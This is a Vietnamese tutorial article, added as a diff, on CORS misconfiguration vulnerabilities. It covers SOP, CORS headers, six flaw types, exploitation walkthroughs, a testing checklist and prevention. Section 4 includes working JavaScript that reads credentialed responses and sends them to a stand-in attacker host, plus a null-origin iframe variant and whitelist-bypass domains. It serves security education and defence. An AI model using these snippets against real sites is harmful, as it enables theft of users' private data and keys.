@@ -1,0 +1,428 @@
+---
+title: "CORS: Chia sẻ tài nguyên đa nguồn gốc"
+description: "Phân tích toàn diện lỗ hổng CORS (Cross-Origin Resource Sharing) — từ nguyên lý Same-Origin Policy (SOP), cơ chế nới lỏng bằng HTTP headers, các kịch bản khai thác thực tế như phản chiếu Origin, null whitelist, XSS qua trust chain, TLS downgrade, đến các biện pháp phòng ngừa."
+date: "2026-04-29"
+category: "vulnerability"
+tags: ["cors", "sop", "cross-origin", "owasp", "web-security", "same-origin-policy"]
+thumbnail: ""
+external_link: ""
+---
+
+
+## 1. Tổng quan nhanh
+
+
+Chia sẻ tài nguyên đa nguồn gốc (CORS - Cross-Origin Resource Sharing) là một cơ chế của trình duyệt web cho phép các trang web kiểm soát quyền truy cập vào các tài nguyên nằm ngoài tên miền của chúng. Cơ chế này mở rộng và tăng thêm tính linh hoạt cho Chính sách cùng nguồn gốc (Same-Origin Policy - SOP) vốn rất khắt khe.
+
+
+Tuy nhiên, nếu một trang web cấu hình và triển khai chính sách CORS không chặt chẽ, điều này sẽ tạo ra các lỗ hổng bảo mật nghiêm trọng, cho phép kẻ tấn công thực hiện các cuộc tấn công xuyên tên miền. Lỗ hổng CORS có thể bị khai thác để đánh cắp dữ liệu nhạy cảm của người dùng (như tin nhắn, thông tin tài khoản) từ trang web mục tiêu. Cần lưu ý một quan niệm sai lầm phổ biến: CORS không phải là cơ chế bảo vệ chống lại tấn công giả mạo yêu cầu liên trang (CSRF).
+
+
+![Minh họa CORS](/images/vulnerabilities/cors/image1.png)
+
+
+<Alert type="warning">
+**Cảnh báo Đạo đức:** Các thông tin và kỹ thuật trong bài viết này chỉ nhằm mục đích cung cấp kiến thức bảo mật, phục vụ cho việc nghiên cứu và kiểm thử trên các hệ thống đã được cấp phép. Tuyệt đối không sử dụng cho các mục đích vi phạm pháp luật.
+</Alert>
+
+
+## 2. Lỗ hổng hoạt động như thế nào?
+
+
+Để hiểu CORS, trước tiên cần nắm vững cơ chế bảo vệ nền tảng là Chính sách cùng nguồn gốc (SOP).
+
+
+### 2.1. Chính sách cùng nguồn gốc (Same-Origin Policy - SOP) là gì?
+
+SOP là một cơ chế bảo mật cốt lõi của trình duyệt web, nhằm ngăn chặn các trang web tấn công lẫn nhau. Chính sách này hạn chế các đoạn mã JavaScript từ một nguồn gốc truy cập vào dữ liệu của nguồn gốc khác. Một nguồn gốc được xác định bởi 3 yếu tố: giao thức, tên miền và cổng.
+
+
+Ví dụ, hãy xem xét đường link sau: Ví dụ: `http://normal-website.com/example/example.html`
+
+
+Đường link này sử dụng giao thức http, tên miền normal-website.com, và cổng mặc định là 80. Bảng dưới đây cho thấy SOP sẽ xử lý thế nào nếu trang web trên cố gắng truy cập vào các nguồn gốc khác:
+
+| URL được truy cập | Truy cập được phép không? | Lý do |
+|---|---|---|
+| Ví dụ: `http://normal-website.com/example/` | Có | Cùng giao thức, tên miền và cổng |
+| Ví dụ: `http://normal-website.com/example2/` | Có | Cùng giao thức, tên miền và cổng |
+| Ví dụ: `https://normal-website.com/example/` | Không | Khác giao thức (https vs http) và cổng (443 vs 80) |
+| Ví dụ: `http://en.normal-website.com/example/` | Không | Khác tên miền (tên miền phụ) |
+| Ví dụ: `http://www.normal-website.com/example/` | Không | Khác tên miền |
+| Ví dụ: `http://normal-website.com:8080/example/` | Không | Khác cổng (8080 vs 80)* |
+
+*(Lưu ý: Trình duyệt Internet Explorer cũ sẽ cho phép trường hợp cuối cùng vì nó không tính cổng vào quy tắc kiểm tra SOP).*
+
+
+**Tại sao SOP lại cần thiết?** Khi trình duyệt gửi yêu cầu HTTP từ trang này sang trang khác, nó sẽ tự động đính kèm tất cả các Cookie (bao gồm cả Cookie phiên đăng nhập) thuộc về tên miền đích. Điều này có nghĩa là phản hồi trả về có thể chứa dữ liệu riêng tư của người dùng. Nếu không có SOP, một trang web độc hại có thể sử dụng JavaScript để đọc trái phép nội dung email hoặc tin nhắn riêng tư của người dùng từ các dịch vụ khác.
+
+
+**Các ngoại lệ của SOP:** SOP chủ yếu kiểm soát quyền truy cập của mã JavaScript đối với các nội dung tải từ tên miền khác. Việc tải tài nguyên xuyên tên miền nhìn chung vẫn được cho phép (như nhúng ảnh qua thẻ `<img>`, video qua `<video>`, hay nhúng file JavaScript qua `<script>`). Dù trang web có thể tải các tài nguyên bên ngoài này về, nhưng mã JavaScript trên trang sẽ không được phép đọc nội dung bên trong của chúng.
+
+
+Một vài ngoại lệ kỹ thuật của SOP:
+
+- Một số đối tượng cho phép ghi nhưng không cho phép đọc chéo tên miền, ví dụ như đối tượng location hoặc thuộc tính location.href từ iframes hoặc cửa sổ mới.
+- Một số đối tượng cho phép đọc nhưng không cho phép ghi, ví dụ như thuộc tính length của đối tượng window (chứa số lượng frame đang dùng trên trang) và thuộc tính closed.
+- Hàm replace thường có thể được gọi xuyên tên miền trên đối tượng location.
+- Một số hàm cụ thể như close, blur, focus có thể gọi xuyên tên miền trên cửa sổ mới. Hàm postMessage cũng dùng được trên iframe và cửa sổ mới để gửi tin nhắn giữa các tên miền.
+- Do các yêu cầu từ hệ thống cũ, SOP lỏng lẻo hơn khi xử lý Cookie, nên Cookie thường có thể truy cập được từ tất cả các tên miền con dù về mặt kỹ thuật chúng là các nguồn gốc khác nhau. Để giảm rủi ro này, bạn nên dùng cờ HttpOnly cho Cookie.
+- Bạn có thể nới lỏng SOP bằng thuộc tính document.domain cho các tên miền. Ví dụ: tên miền marketing.example.com muốn đọc nội dung từ example.com, cả hai bên chỉ cần gán document.domain = "example.com". Trình duyệt hiện đại đã chặn việc gán giá trị này thành đuôi tên miền cấp cao (như .com) để tránh việc các trang web không liên quan truy cập lẫn nhau.
+
+### 2.2. Nới lỏng SOP bằng cơ chế CORS
+
+Do SOP áp dụng các ràng buộc chặt chẽ, nhiều ứng dụng web hiện đại không thể hoạt động bình thường khi cần chia sẻ dữ liệu hợp pháp với các tên miền phụ hoặc đối tác bên thứ ba. CORS ra đời như một cơ chế mở rộng có kiểm soát cho SOP, sử dụng một tập hợp các tiêu đề HTTP để khai báo các nguồn gốc được tin cậy.
+
+
+**Tiêu đề Access-Control-Allow-Origin:** Đây là tiêu đề quan trọng nhất, được máy chủ trả về để cho biết nguồn gốc nào được phép đọc dữ liệu. Giả sử trang web gửi một yêu cầu chéo tên miền:
+
+
+```http
+GET /data HTTP/1.1
+Host: robust-website.com
+Origin: https://normal-website.com
+```
+
+
+Máy chủ trả về phản hồi:
+
+
+```http
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://normal-website.com
+```
+
+
+Trình duyệt thấy tiêu đề Origin của người gửi và Access-Control-Allow-Origin của máy chủ khớp nhau, nên nó sẽ cho phép đoạn mã JavaScript đọc dữ liệu phản hồi này. Tiêu đề này có thể chứa một tên miền cụ thể, giá trị null, hoặc dấu sao * (đại diện cho mọi tên miền). *(Lưu ý: Mặc dù chuẩn CORS cho phép liệt kê nhiều tên miền cùng lúc, nhưng trên thực tế không có trình duyệt nào hỗ trợ điều này).*
+
+
+*Lưu ý quan trọng: Dấu sao (wildcard) không được phép dùng lồng bên trong một chuỗi URL bất kỳ. Ví dụ, đoạn code cấu hình tiêu đề dưới đây là KHÔNG HỢP LỆ:*
+
+
+```http
+Access-Control-Allow-Origin: https://*.normal-website.com
+```
+
+
+**Xử lý các yêu cầu chứa thông tin xác thực (Credentials):** Mặc định, các yêu cầu CORS chéo tên miền sẽ không mang theo Cookie hay tiêu đề xác thực. Để trình duyệt cho phép đọc phản hồi, máy chủ phải trả về tiêu đề Access-Control-Allow-Credentials: true VÀ đoạn mã JavaScript ở phía người dùng cũng phải khai báo gửi kèm thông tin (ví dụ thiết lập tính năng gửi Cookie).
+
+
+Giả sử trang web dùng JavaScript gửi yêu cầu kèm Cookie:
+
+
+```http
+GET /data HTTP/1.1
+Host: robust-website.com
+...
+Origin: https://normal-website.com
+Cookie: JSESSIONID=<value>
+```
+
+
+Và máy chủ trả về:
+
+
+```http
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://normal-website.com
+Access-Control-Allow-Credentials: true
+```
+
+
+Lúc này trình duyệt mới cho phép trang web đọc dữ liệu. Về mặt bảo mật, chuẩn CORS cấm tuyệt đối việc kết hợp dùng dấu sao * cùng với tiêu đề cho phép thông tin xác thực. Bạn không thể cấu hình như thế này:
+
+
+```http
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+
+Cấu hình này cực kỳ nguy hiểm vì nó phơi bày dữ liệu của người dùng đã xác thực cho toàn bộ internet. Để vượt qua giới hạn này, nhiều máy chủ web tự động sao chép giá trị Origin từ yêu cầu của người dùng và gán trực tiếp vào tiêu đề Access-Control-Allow-Origin. Đây chính là điểm yếu nghiêm trọng mà kẻ tấn công thường khai thác.
+
+
+**Kiểm tra trước (Pre-flight checks):** Khi một yêu cầu chéo tên miền sử dụng các phương thức hoặc tiêu đề HTTP không tiêu chuẩn, trình duyệt sẽ gửi trước một yêu cầu thăm dò bằng phương thức OPTIONS để kiểm tra xem máy chủ có chấp nhận yêu cầu này không. Ví dụ một yêu cầu sử dụng phương thức PUT kèm tiêu đề tùy chỉnh:
+
+
+```http
+OPTIONS /data HTTP/1.1
+Host: <some website>
+...
+Origin: https://normal-website.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Special-Request-Header
+```
+
+
+Máy chủ có thể phản hồi cho phép như sau:
+
+
+```http
+HTTP/1.1 204 No Content
+...
+Access-Control-Allow-Origin: https://normal-website.com
+Access-Control-Allow-Methods: PUT, POST, OPTIONS
+Access-Control-Allow-Headers: Special-Request-Header
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 240
+```
+
+
+Phản hồi này khai báo các lệnh được phép, các tiêu đề được phép, cho phép thông tin xác thực, và thời gian lưu cache (Access-Control-Max-Age). Chỉ khi nhận được phản hồi này, trình duyệt mới gửi yêu cầu thực sự đi. Việc này sẽ làm tăng thêm một vòng di chuyển dữ liệu (round-trip), tốn thêm chút thời gian tải trang.
+
+
+**CORS có chống được CSRF không?** CORS không cung cấp cơ chế bảo vệ chống lại tấn công CSRF, đây là một quan niệm sai lầm rất phổ biến. Bản chất CORS là nới lỏng chính sách SOP, nên việc cấu hình CORS kém thậm chí còn làm tăng khả năng bị tấn công CSRF hoặc làm trầm trọng thêm hậu quả của nó. Có rất nhiều cách để thực hiện CSRF mà không cần dùng đến CORS, bao gồm việc sử dụng các biểu mẫu HTML cơ bản hoặc nhúng tài nguyên chéo tên miền.
+
+
+### 2.3. Cơ chế phát sinh lỗ hổng CORS
+
+Lỗ hổng CORS phát sinh khi máy chủ thiếu quy trình xác thực nguồn gốc trước khi nới lỏng SOP. Thay vì so khớp tiêu đề Origin của người dùng với một danh sách các nguồn gốc tin cậy (Whitelist), máy chủ lại thực hiện một trong hai hành vi thiếu an toàn sau:
+
+- **Phản chiếu mù quáng (Blind Reflection):** Máy chủ lập trình để tự động lấy giá trị từ tiêu đề Origin trong yêu cầu của client và gán trực tiếp nó vào tiêu đề Access-Control-Allow-Origin trả về. Điều này có nghĩa là máy chủ đang "tin tưởng tuyệt đối" vào bất kỳ trang web nào gửi yêu cầu tới nó.
+- **Sai sót trong logic kiểm tra:** Máy chủ có danh sách whitelist nhưng sử dụng các thuật toán so khớp chuỗi yếu (như kiểm tra tiền tố, hậu tố hoặc biểu thức chính quy thiếu chặt chẽ). Kẻ tấn công có thể đăng ký các tên miền tương tự để đánh lừa hệ thống.
+
+Khi một trong hai hành vi này kết hợp với tiêu đề Access-Control-Allow-Credentials: true, kẻ tấn công có thể lừa người dùng đã đăng nhập truy cập vào trang web độc hại, từ đó gửi yêu cầu CORS để trích xuất toàn bộ dữ liệu nhạy cảm của người dùng đó.
+
+
+## 3. Các biến thể và Phân loại
+
+
+Các lỗ hổng CORS chủ yếu xuất phát từ những sai lầm trong cấu hình. Để đảm bảo ứng dụng hoạt động trơn tru với các đối tác, lập trình viên thường cấu hình CORS quá dễ dãi. Các lỗ hổng được phân thành 6 loại chính:
+
+- **Máy chủ tự động phản chiếu Origin của client:** Thay vì duy trì danh sách tên miền được phép, máy chủ tự động sao chép giá trị Origin từ yêu cầu của người dùng và gán vào tiêu đề phản hồi. Điều này tạo ra lỗ hổng cho phép bất kỳ trang web nào truy cập dữ liệu.
+- **Lỗi phân tích cú pháp tiêu đề Origin:** Máy chủ sử dụng danh sách cho phép (whitelist) nhưng thuật toán kiểm tra (so sánh tiền tố hoặc hậu tố) có sai sót logic, khiến các tên miền giả mạo có thể vượt qua được.
+- **Đưa giá trị null vào danh sách trắng:** Một số lập trình viên đưa giá trị null vào danh sách cho phép để hỗ trợ môi trường kiểm thử nội bộ. Kẻ tấn công có thể lợi dụng điều này để gửi yêu cầu với Origin là null nhằm đánh cắp dữ liệu.
+- **Khai thác XSS qua mối quan hệ tin cậy CORS:** Ngay cả khi CORS được cấu hình đúng, nếu một tên miền đối tác được tin cậy bị lỗi XSS, kẻ tấn công có thể khai thác lỗ hổng đó để gửi yêu cầu CORS hợp lệ.
+- **Phá vỡ kết nối bảo mật TLS bằng CORS cấu hình kém:** Xảy ra khi một trang web sử dụng HTTPS nhưng lại tin cậy một tên miền phụ chạy HTTP không mã hóa. Kẻ tấn công có thể chặn bắt lưu lượng HTTP để giả mạo yêu cầu CORS.
+- **Mạng nội bộ và CORS không cần thông tin xác thực:** Các máy chủ nội bộ thường không yêu cầu xác thực đối với mọi yêu cầu. Nếu nhân viên vô tình truy cập trang web độc hại, trình duyệt của họ có thể bị lợi dụng làm trạm trung chuyển để trích xuất tài liệu nội bộ.
+
+## 4. Hướng dẫn khai thác thực tế
+
+
+Dưới đây là chi tiết từng kịch bản khai thác.
+
+
+### 4.1. Máy chủ tự động phản chiếu Origin của client
+
+Duy trì danh sách tên miền được phép đòi hỏi nhiều công sức quản lý. Do đó, nhiều máy chủ tự động đọc giá trị tiêu đề Origin từ yêu cầu của người dùng và sao chép trực tiếp vào tiêu đề Access-Control-Allow-Origin trong phản hồi. Giả sử máy chủ nhận yêu cầu từ trang web độc hại:
+
+
+```http
+GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=...
+```
+
+
+Máy chủ phản hồi:
+
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+...
+```
+
+
+Do máy chủ phản chiếu bất kỳ nguồn gốc nào, kẻ tấn công có thể nhúng mã JavaScript lên trang web của mình để đánh cắp dữ liệu nhạy cảm (như API Key) của nạn nhân:
+
+
+```javascript
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='//malicious-website.com/log?key='+this.responseText;
+};
+```
+
+
+### 4.2. Lỗi phân tích cú pháp tiêu đề Origin
+
+Thay vì phản chiếu mọi thứ, một số máy chủ dùng danh sách trắng. Khi nhận yêu cầu, nó so sánh Origin với danh sách này, nếu hợp lệ mới trả về header cho phép:
+
+
+```http
+GET /data HTTP/1.1
+Host: normal-website.com
+...
+Origin: https://innocent-website.com
+```
+
+
+Phản hồi:
+
+
+```http
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://innocent-website.com
+```
+
+
+Tuy nhiên, sai sót thường nằm ở cách code thuật toán so sánh chuỗi.
+
+- Nếu thuật toán chỉ kiểm tra tên miền có **kết thúc bằng** `normal-website.com` hay không, kẻ tấn công có thể vượt qua cơ chế kiểm tra bằng cách đăng ký tên miền: `hackersnormal-website.com`
+- Nếu thuật toán chỉ kiểm tra tên miền có **bắt đầu bằng** `normal-website.com` hay không, kẻ tấn công có thể sử dụng tên miền con: `normal-website.com.evil-user.net`
+
+### 4.3. Đưa giá trị "null" vào danh sách trắng
+
+Chuẩn CORS hỗ trợ giá trị null trong tiêu đề Origin. Trình duyệt sẽ gửi Origin: null trong các tình huống đặc biệt như: chuyển hướng chéo tên miền, dữ liệu được tuần tự hóa, yêu cầu qua giao thức file:, hoặc từ các iframe bị cô lập (sandboxed). Một số lập trình viên đưa chữ null vào danh sách cho phép để tiện việc code và test nội bộ:
+
+
+```http
+GET /sensitive-victim-data
+Host: vulnerable-website.com
+Origin: null
+```
+
+
+Phản hồi:
+
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
+
+Kẻ tấn công chỉ cần dẫn dụ nạn nhân mở một trang chứa iframe bị cô lập (sandboxed) để trình duyệt tự động đặt giá trị Origin thành null. Yêu cầu sẽ vượt qua cơ chế xác thực của máy chủ và đánh cắp dữ liệu:
+
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='https://malicious-website.com/log?key='+this.responseText;
+};
+&lt;/script&gt;"></iframe>
+```
+
+
+### 4.4. Khai thác XSS qua mối quan hệ tin cậy CORS
+
+Dù CORS được cấu hình hoàn hảo, nó vẫn tạo ra một mối liên kết tin cậy. Nếu trang web chính tin tưởng một tên miền phụ, mà tên miền phụ đó lại bị lỗi XSS, hacker có thể mượn XSS để kích hoạt CORS. Giả sử cấu hình máy chủ:
+
+
+```http
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://subdomain.vulnerable-website.com
+Cookie: sessionid=...
+```
+
+
+Phản hồi cho phép:
+
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+```
+
+
+Khi phát hiện lỗi XSS trên `subdomain.vulnerable-website.com`, kẻ tấn công có thể đánh cắp API key của trang web chính thông qua đường dẫn: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
+
+
+### 4.5. Phá vỡ kết nối bảo mật TLS bằng CORS cấu hình kém
+
+Giả sử một trang web bảo mật dùng toàn HTTPS, nhưng lại tin tưởng một tên miền phụ dùng HTTP không an toàn:
+
+
+```http
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: http://trusted-subdomain.vulnerable-website.com
+Cookie: sessionid=...
+```
+
+
+Phản hồi cho phép:
+
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+```
+
+
+Hacker có mặt trong cùng vị trí (như bắt gói tin mạng WiFi) có thể can thiệp lưu lượng của nạn nhân qua các bước sau:
+
+- Nạn nhân gửi bất kỳ một yêu cầu HTTP không mã hóa nào.
+- Hacker can thiệp và ép trình duyệt chuyển hướng đến: Ví dụ: `http://trusted-subdomain.vulnerable-website.com`
+- Khi trình duyệt gửi yêu cầu đến tên miền phụ đó, kẻ tấn công chặn và chèn một phản hồi giả mạo chứa mã CORS trỏ về trang web chính `https://vulnerable-website.com`.
+- Trình duyệt tin tưởng phản hồi, tự động gửi yêu cầu CORS kèm theo nguồn gốc `http://trusted-subdomain.vulnerable-website.com`.
+- Trang web chính xác nhận tên miền hợp lệ và trả về dữ liệu nhạy cảm. Trang giả mạo đọc dữ liệu và chuyển về máy chủ của kẻ tấn công. Cuộc tấn công thành công dù trang web chính sử dụng HTTPS và Cookie được đánh dấu bảo mật (Secure).
+
+### 4.6. Mạng nội bộ và CORS không cần thông tin xác thực
+
+Phần lớn các kịch bản tấn công CORS yêu cầu tiêu đề xác thực để truy cập dữ liệu riêng tư. Tuy nhiên, đối với môi trường mạng nội bộ (Intranet), các máy chủ thường không yêu cầu xác thực. Giả sử máy chủ nội bộ có cấu hình CORS thiếu an toàn:
+
+
+```http
+GET /reader?url=doc1.pdf
+Host: intranet.normal-website.com
+Origin: https://normal-website.com
+```
+
+
+Phản hồi:
+
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+```
+
+
+Máy chủ nội bộ đang chấp nhận yêu cầu từ mọi nguồn gốc. Nếu một nhân viên truy cập vào trang web độc hại từ mạng nội bộ, kẻ tấn công có thể lợi dụng trình duyệt của nhân viên đó như một proxy để trích xuất tài liệu nội bộ của tổ chức.
+
+
+## 5. Checklist Kiểm thử và Nhận diện
+
+
+Dưới đây là bảng tổng hợp các phương pháp để tìm ra lỗ hổng CORS.
+| Phương pháp kiểm thử | Mô tả |
+|---|---|
+| Thêm/sửa tiêu đề `Origin` tùy ý | Xem phản hồi có phản chiếu lại giá trị Origin trong `Access-Control-Allow-Origin` không |
+| Thử `Origin: null` | Kiểm tra máy chủ có trả về `Access-Control-Allow-Origin: null` không |
+| Kiểm tra whitelist regex lỗi hậu tố | Thử `hackersnormal-website.com` để bypass kiểm tra endsWith |
+| Kiểm tra whitelist regex lỗi tiền tố | Thử `normal-website.com.evil.net` để bypass kiểm tra startsWith |
+| Kiểm tra wildcard `*` + Credentials | Xem wildcard có bị kết hợp với `Access-Control-Allow-Credentials: true` không |
+| Tìm XSS trên subdomain được tin cậy | Nếu subdomain bị XSS thì có thể khai thác CORS từ đó |
+| Kiểm tra subdomain HTTP trong whitelist | Tìm subdomain dùng HTTP không mã hóa đang được tin tưởng trong cấu hình CORS |
+| Kiểm tra mạng nội bộ | Gửi yêu cầu từ bên ngoài vào endpoint intranet, xem có phản hồi không |
+
+
+
+
+## 6. Cách phòng ngừa và Khắc phục
+
+
+Các lỗ hổng CORS chủ yếu sinh ra do cấu hình sai. Việc phòng ngừa hoàn toàn nằm ở khâu thiết lập và quản lý.
+
+- **Cấu hình chuẩn xác cho các yêu cầu chéo nguồn gốc:** Nếu một tài nguyên web chứa thông tin nhạy cảm, nguồn gốc được phép truy cập phải được chỉ định chính xác tuyệt đối trong tiêu đề Access-Control-Allow-Origin.
+- **Chỉ cho phép các trang web thực sự tin cậy:** Nguồn gốc khai báo trong tiêu đề phải là các trang web đã được xác minh. Tuyệt đối tránh việc tự động phản chiếu tiêu đề Origin của người dùng gửi lên để làm giá trị trả về, vì đây là lỗ hổng dễ khai thác nhất.
+- **Không bao giờ đưa giá trị "null" vào danh sách trắng:** Hãy tránh việc sử dụng tiêu đề Access-Control-Allow-Origin: null. Các tệp HTML nội bộ hay các yêu cầu từ iframe bị cô lập đều có thể sinh ra giá trị null này. Các tiêu đề CORS cần phải định nghĩa rõ ràng các nguồn gốc cụ thể được tin cậy.
+- **Tránh sử dụng dấu sao (*) trong mạng nội bộ:** Tuyệt đối không dùng dấu sao đại diện trong môi trường mạng nội bộ. Việc phó mặc sự an toàn cho hệ thống cấu hình mạng là không đủ, bởi vì chính các trình duyệt mạng nội bộ của nhân viên có thể vô tình kết nối ra các tên miền độc hại bên ngoài.
+- **CORS không phải là sự thay thế cho bảo mật máy chủ:** CORS chỉ định nghĩa các hành vi kiểm tra trên trình duyệt của người dùng, nó không bao giờ có thể thay thế việc bảo vệ dữ liệu ở phía máy chủ. Một hacker có kỹ năng có thể tự tạo các gói tin giả mạo trực tiếp từ hệ thống của họ để gửi thẳng vào máy chủ mà không cần thông qua trình duyệt. Do đó, ngoài việc cấu hình CORS đúng chuẩn, máy chủ web vẫn phải áp dụng đầy đủ các biện pháp bảo vệ khắt khe như hệ thống Xác thực và Quản lý phiên để bảo vệ dữ liệu nhạy cảm.
+## Tham khảo
+
+- [PortSwigger — CORS](https://portswigger.net/web-security/cors)
+- [MDN — Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
+- [OWASP — CORS Misconfiguration](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
